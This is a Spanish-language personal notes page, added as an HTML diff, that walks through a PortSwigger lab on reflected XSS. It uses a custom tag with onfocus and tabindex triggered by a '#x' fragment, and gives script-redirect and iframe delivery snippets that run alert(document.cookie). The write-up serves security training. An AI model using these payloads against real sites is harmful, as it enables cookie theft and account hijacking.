@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;https://www.youtube.com/watch?v=sjs6RS7lURk&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>https://www.youtube.com/watch?v=sjs6RS7lURk</p>
+
+<p>Metemos esto en el campo de búsqueda, se va a reflejar en el DOM</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;custom-tag</span> <span class="na">onfocus=</span><span class="s">'alert(1)'</span> <span class="na">id=</span><span class="s">'x'</span> <span class="na">tabindex=</span><span class="s">"1"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Cuando en la url busquemos https://url#x , estaremos haciendo focus en el elemento y por lo tanto se ejecutará.</p>
+
+<p>Tabindex -&gt; si presiones en la url y le das n veces a tab te salta la alerta, con un custom tag.
+==Es necesario usar tabindex ya que custom-tag no es un elemento focusable.==</p>
+
+<p>No podemos usar un autofocus porque no está permitido en los custom-tags, tenemos que usar el attack server  para hacerle llegar al cliente la url que tiene que abrir para que se ejecute el xss:</p>
+
+<p>https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag%20onfocus=’alert(document.cookie)’%20id=’x’%20tabindex=%221%22%3E#x</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=<span class="nt">&lt;custom-tag</span> <span class="na">onfocus=</span><span class="s">'alert(document.cookie)'</span> <span class="na">id=</span><span class="s">'x'</span> <span class="na">tabindex=</span><span class="s">"1"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x</span><span class="dl">'</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> 
+  <span class="na">src=</span><span class="s">"https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E"</span> 
+  <span class="na">onload=</span><span class="s">"this.src+='#x"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
